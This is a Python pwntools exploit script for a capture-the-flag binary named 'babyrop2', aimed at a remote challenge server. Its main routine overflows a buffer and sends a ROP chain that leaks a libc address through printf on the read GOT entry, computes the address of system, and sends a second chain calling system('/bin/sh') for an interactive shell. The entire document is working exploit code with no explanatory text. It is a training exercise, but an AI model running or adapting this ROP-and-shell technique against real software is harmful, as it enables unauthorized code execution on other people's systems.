

#!/usr/bin/python2.7
#-*- encoding: utf-8 -*-
from pwn import *
context.binary = ELF('./babyrop2')
context.log_level = 'debug'
elf = context.binary
libc = elf.libc

def dbg():
	raw_input()


main_addr = 0x400540
p6_addr = 0x40072A 
call_addr = 0x400710
printf_plt = 0x4004f0
pop_rdi  =0x0000000000400733 # pop rdi ; ret
pop_rsi_r15 = 0x400731

bss = 0x601050 + 0x500
printf_got = elf.got['printf']
read = 0x400695				#mov edi, 0; call read
read_got = elf.got['read'] 
format_str = 0x400770

def makecall(addr, rdi, rsi, rdx, tail = 0):
    payload = ''
    payload += p64(p6_addr)
    payload += p64(0x0)
    payload += p64(0x1)
    payload += p64(addr)
    payload += p64(rdx)
    payload += p64(rsi)
    payload += p64(rdi)
    payload += p64(call_addr)
    if (tail):
        payload += p64(0x0) * 7 + p64(tail)
    return payload


def exploit():
	p = remote('node2.buuoj.cn.wetolink.com', 28749)
	#p = process('./babyrop2')
	#gdb.attach(p, 'b* 0x4006CA')
	padding = 'a' * 0x20
	payload1 = padding
	payload1 += p64(bss-8)					#fake_rbp
	payload1 += p64(pop_rdi)
	payload1 += p64(read_got)
	payload1 += p64(printf_plt)

	payload1 += p64(pop_rsi_r15)
	payload1 += p64(bss) + p64(0)
	payload1 += p64(read)


	p.sendlineafter("What's your name?", payload1)
	p.recvline()

	read_addr = u64(p.recv(6).ljust(8, '\x00'))

	libc.address = read_addr - libc.symbols['read']
	system_addr = libc.symbols['system']

	#print "system_addr ==> " + hex(system_addr)

	payload2 = ""
	payload2 += p64(pop_rdi)
	payload2 += p64(bss+0x18)
	payload2 += p64(system_addr)
	payload2 += '/bin/sh\x00'

	p.sendline(payload2)

	p.interactive()
	p.close()



if __name__ == '__main__':
	exploit()
